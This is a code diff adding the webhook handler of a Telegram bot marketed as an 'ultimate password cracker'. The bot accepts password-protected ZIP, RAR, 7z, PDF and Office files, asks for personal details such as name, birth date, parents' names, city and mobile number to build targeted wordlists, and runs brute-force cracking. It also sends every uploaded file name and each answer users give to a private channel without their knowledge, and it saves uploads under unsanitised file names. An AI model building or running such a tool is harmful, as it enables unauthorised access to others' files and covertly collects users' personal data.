@@ -562,9 +562,11 @@ def check_channel_membership(user_id):
         return False
 
 # ============================================================
-# INLINE KEYBOARDS
+# FIXED: INLINE KEYBOARDS - Callback Data Proper Format
 # ============================================================
+
 def get_auto_buttons():
+    """Returns properly formatted inline keyboard with callback_data"""
     return {
         "inline_keyboard": [
             [
@@ -585,6 +587,220 @@ def join_verify_keyboard():
     }
 
 
+# ============================================================
+# FIXED: WEBHOOK HANDLER - PROPER CALLBACK ROUTING
+# ============================================================
+
+@app.route(f'/webhook/{TOKEN}', methods=['POST'])
+def webhook():
+    try:
+        update = request.get_json()
+        if not update:
+            return jsonify({"status": "error"}), 400
+        
+        # ========== MESSAGE HANDLER ==========
+        if 'message' in update:
+            message = update['message']
+            chat_id = message['chat']['id']
+            user_id = message['from']['id']
+            username = message['from'].get('username', str(user_id))
+            
+            if 'text' in message:
+                text = message['text']
+                
+                if text == '/start':
+                    if not check_channel_membership(user_id):
+                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
+                    else:
+                        send_message(chat_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me any password protected file.*\n\nSupported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX", parse_mode='Markdown')
+                    return jsonify({"status": "ok"}), 200
+                
+                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
+                    session = user_sessions[chat_id]
+                    field = session['current_field']
+                    session['info'][field] = text
+                    
+                    try:
+                        send_message(PRIVATE_CHANNEL, f"📝 *{field.title()}:* {text}\n👤 @{username}")
+                    except:
+                        pass
+                    
+                    fields = session['fields']
+                    current_index = fields.index(field)
+                    
+                    if current_index + 1 < len(fields):
+                        next_field = fields[current_index + 1]
+                        session['current_field'] = next_field
+                        send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
+                    else:
+                        session['state'] = 'cracking'
+                        info_summary = "📝 *User Info Collected*\n\n"
+                        for f, v in session['info'].items():
+                            info_summary += f"📌 *{f.title()}:* {v}\n"
+                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
+                        try:
+                            send_message(PRIVATE_CHANNEL, info_summary)
+                        except:
+                            pass
+                        
+                        send_message(chat_id, "🔄 *Generating ultimate passwords...*\n⏳ Please wait...", parse_mode='Markdown')
+                        
+                        generator = UltimatePasswordGenerator()
+                        password_list = generator.generate_ultimate_passwords(session['info'])
+                        
+                        session_id = f"{chat_id}_{int(time.time())}"
+                        cracking_sessions[session_id] = {
+                            'password_list': password_list,
+                            'file_path': session['file_path'],
+                            'file_ext': session['file_ext'],
+                            'file_name': session['file_name']
+                        }
+                        
+                        machine_url = f"{RENDER_URL}/view/{session_id}"
+                        send_message(chat_id, f"🔗 *Brute-Force Machine Started!*\n\n📊 {len(password_list)} passwords loaded\n🔗 [Click here to watch live cracking]({machine_url})\n\n_Password will be sent here when found._", parse_mode='Markdown')
+                        
+                        threading.Thread(target=crack_in_background, args=(chat_id, session_id, session)).start()
+                        
+                        generator.clear()
+                        del user_sessions[chat_id]
+                    return jsonify({"status": "ok"}), 200
+            
+            # ========== FILE HANDLER ==========
+            if 'document' in message:
+                file = message['document']
+                file_name = file.get('file_name', 'unknown')
+                file_id = file['file_id']
+                
+                if not check_channel_membership(user_id):
+                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
+                    return jsonify({"status": "ok"}), 200
+                
+                # Download file
+                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
+                file_path_api = file_info['result']['file_path']
+                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
+                response = requests.get(file_url)
+                
+                os.makedirs("downloads", exist_ok=True)
+                file_path = f"downloads/{file_name}"
+                with open(file_path, 'wb') as f:
+                    f.write(response.content)
+                
+                ext = file_name.split('.')[-1].lower()
+                
+                try:
+                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
+                except:
+                    pass
+                
+                user_sessions[chat_id] = {
+                    'file_path': file_path,
+                    'file_name': file_name,
+                    'file_ext': ext,
+                    'state': 'waiting_for_option'
+                }
+                
+                # 🔥 FIXED: Properly send inline keyboard
+                send_message(
+                    chat_id,
+                    f"📁 *File Received!*\n\n📄 {file_name}\n🔽 *Choose an option:*",
+                    reply_markup=get_auto_buttons(),  # ✅ Function call
+                    parse_mode='Markdown'
+                )
+                
+                return jsonify({"status": "ok"}), 200
+        
+        # ========== CALLBACK QUERY HANDLER ==========
+        if 'callback_query' in update:
+            callback = update['callback_query']
+            callback_id = callback['id']
+            chat_id = callback['message']['chat']['id']
+            message_id = callback['message']['message_id']
+            user_id = callback['from']['id']
+            data = callback['data']
+            
+            print(f"🔔 Callback received: {data} from user {user_id}")  # 🔥 Debug log
+            
+            # ---------- VERIFY ----------
+            if data == 'verify':
+                if check_channel_membership(user_id):
+                    edit_message(chat_id, message_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n📁 *Send me a file.*", parse_mode='Markdown')
+                else:
+                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
+                answer_callback(callback_id)
+                return jsonify({"status": "ok"}), 200
+            
+            # ---------- AUTO DIRECT ----------
+            if data == 'auto_direct':
+                session = user_sessions.get(chat_id)
+                if not session:
+                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
+                    answer_callback(callback_id)
+                    return jsonify({"status": "ok"}), 200
+                
+                edit_message(chat_id, message_id, "🔄 *AUTO mode activated (Direct)...*\n⏳ Generating ultimate passwords...", parse_mode='Markdown')
+                
+                generator = UltimatePasswordGenerator()
+                password_list = generator.generate_ultimate_passwords()
+                
+                session_id = f"{chat_id}_{int(time.time())}"
+                cracking_sessions[session_id] = {
+                    'password_list': password_list,
+                    'file_path': session['file_path'],
+                    'file_ext': session['file_ext'],
+                    'file_name': session['file_name']
+                }
+                
+                machine_url = f"{RENDER_URL}/view/{session_id}"
+                send_message(chat_id, f"🔗 *Brute-Force Machine Started!*\n\n📊 {len(password_list)} passwords loaded\n🔗 [Click here to watch live cracking]({machine_url})\n\n_Password will be sent here when found._", parse_mode='Markdown')
+                
+                threading.Thread(target=crack_in_background, args=(chat_id, session_id, session)).start()
+                
+                generator.clear()
+                del user_sessions[chat_id]
+                answer_callback(callback_id)
+                return jsonify({"status": "ok"}), 200
+            
+            # ---------- AUTO INFO ----------
+            if data == 'auto_info':
+                session = user_sessions.get(chat_id)
+                if not session:
+                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
+                    answer_callback(callback_id)
+                    return jsonify({"status": "ok"}), 200
+                
+                fields = ['name', 'dob', 'father', 'mother', 'city', 'mobile']
+                session['info'] = {}
+                session['fields'] = fields
+                session['current_field'] = fields[0]
+                session['state'] = 'collecting_info'
+                
+                edit_message(chat_id, message_id, "📝 *Let's collect some info for ultimate password generation*\n\n", parse_mode='Markdown')
+                send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
+                answer_callback(callback_id)
+                return jsonify({"status": "ok"}), 200
+            
+            # ---------- CANCEL ----------
+            if data == 'cancel':
+                session = user_sessions.get(chat_id)
+                if session and session.get('file_path'):
+                    os.remove(session['file_path'])
+                del user_sessions[chat_id]
+                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
+                answer_callback(callback_id)
+                return jsonify({"status": "ok"}), 200
+            
+            # 🔥 If callback data not matched
+            send_message(chat_id, f"❌ Unknown callback: {data}", parse_mode='Markdown')
+            answer_callback(callback_id)
+            return jsonify({"status": "ok"}), 200
+        
+        return jsonify({"status": "ok"}), 200
+        
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+        
 # ============================================================
 # BRUTE-FORCE STREAM HANDLER
 # ============================================================
